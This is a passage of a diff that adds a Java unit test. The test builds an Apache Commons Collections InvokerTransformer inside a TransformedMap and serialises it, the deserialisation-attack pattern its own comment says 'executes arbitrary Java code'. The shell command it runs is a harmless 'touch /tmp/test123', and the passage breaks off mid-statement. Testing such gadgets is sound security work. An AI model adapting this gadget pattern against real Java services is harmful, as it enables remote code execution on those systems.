@@ -1,0 +1,23 @@
+public void testInvokerTransformer() throws Exception {
+    String command = "touch /tmp/test123";
+    String[] execArgs = { "/bin/sh", "-c", command };
+
+    Transformer transformer = new InvokerTransformer("exec", new Class[] { Object[].class }, new Object[] { execArgs });
+    Set<Object> set = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>());
+    set.add(transformer);
+
+    Map<String, Object> map = new HashMap<>();
+    map.put("transformer", transformer);
+    map.put("foo", "foo");
+
+    Map invokerMap = TransformedMap.decorate(map, null, transformer);
+    assertEquals(invokerMap.size(), 2);
+    assertEquals(invokerMap.get("foo"), "foo");
+
+    // this executes arbitrary Java code
+    ByteArrayOutputStream out = new ByteArrayOutputStream();
+    ObjectOutputStream oos = new ObjectOutputStream(out);
+    oos.writeObject(invokerMap);
+    oos.close();
+
+    ByteArrayInputStream in
